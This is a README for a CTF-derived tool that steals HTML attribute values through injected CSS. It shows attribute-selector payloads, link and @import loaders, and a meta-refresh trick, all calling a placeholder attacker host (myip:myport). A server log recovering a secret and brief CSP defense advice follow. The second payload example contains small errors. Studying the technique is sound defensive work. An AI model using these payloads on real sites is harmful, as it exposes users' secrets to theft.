# CSS Exfil

## Concept
This is inspired by a web challenge called "Free as is Freedom" that was proposed in the 2019 [X-MAS CTF](https://xmas.htsp.ro/home). In this challenge you were able to inject an arbitrary string into a document that the victim would then load in a browser. It looks like a traditionnal XSS challenge, except in this case the CSP doesn't allow you to run javascript and there is no way around it. Instead, the idea is to exfiltrate the value of an HTML attribute using [CSS attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors).

Let's say you want to exfiltrate the value of the `value` attribute:
```html
<input type="text" id="name" value="S3cr3t">
```
What you need to do is inject a bunch of [CSS attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors), each matching a value starting with a different character:
```HTML
<style>
input#name[value^="a"] { background: url("http://myip:myport/reveal?c=a"); }
input#name[value^="b"] { background: url("http://myip:myport/reveal?c=b"); }
...
input#name[value^="S"] { background: url("http://myip:myport/reveal?c=S"); }
...
</style>
```
It can be done either by injecting the payload above directly into the victim's document, or by injecting a link to your own web server, which will respond with the same payload (without the `<style>` tags):
```HTML
<link rel="stylesheet" href="http://myip:myport/evil.css">
```
It can also be done using CSS imports:
```HTML
<style>@import url("http://myip:myport/evil.css");</style>
```
Either way, only one the CSS selectors will match, and it will trigger a `GET` request to your server to load the corresponding background image. In this case, you will receive the following request:
```
GET /reveal?c=S HTTP/1.1
...
```
You've read the first character. You can repeat the process to read the second character using this payload:
```HTML
<script>
input#name[value^="Sa"] { background: url("http://myip:myport/reveal?c=a"); }
input#name[value^="Sb"] { background: url("http://myip:myport/reveal?c=b"); }
...
input#name[value^="S3"] { background: url("http://myip:myport/reveal?c=S"); }
...
</script>
```
# The Script
The `css_exfil.py` script automates this process. It uses [Flask](https://palletsprojects.com/p/flask/) to serve the payloads and retrieve the exfiltrated characters. A request to `/evil.css` returns the set of CSS attribute selectors that is used to reveal the next character. A request to `/reveal?c=x` (made to retrieve the background image) returns a 404 error and adds `x` to the exfiltrated secret. It two consecutive requests are made to the `/evil.css` URL with no `/reveal` request in between then it means the last set of CSS attribute selectors haven't matched anything, and the secret has been read completely.

For this to work, we need the victim to make repeated requests to `evil.css`. It can be done by adding a `refresh` to the injected payload:
```html
<link rel="stylesheet" href="http://myip:myport/evil.css">
<meta http-equiv="refresh" content="1">
```
The script is run as follows:
```
$ ./css_exfil.py -l $myip:$myport -s 'input#name' -a value
 * Serving Flask app "css_exfil" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:8080/ (Press CTRL+C to quit)
127.0.0.1 - - [23/Dec/2019 18:25:38] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:38] "GET /reveal?c=S HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:39] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:39] "GET /reveal?c=3 HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:40] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:40] "GET /reveal?c=c HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:41] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:41] "GET /reveal?c=r HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:42] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:42] "GET /reveal?c=3 HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:43] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:43] "GET /reveal?c=t HTTP/1.1" 404 -
127.0.0.1 - - [23/Dec/2019 18:25:44] "GET /evil.css HTTP/1.1" 200 -
127.0.0.1 - - [23/Dec/2019 18:25:45] "GET /evil.css HTTP/1.1" 200 -
S3cr3t
```
## Defense
Other than properly sanitizing user input to prevent HTML injection, the `style-src-elem` or the broader `style-src` (or `default-src`) CSP rules can be set to prevent loading CSS files from untrusted sources.
## Links
[Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)

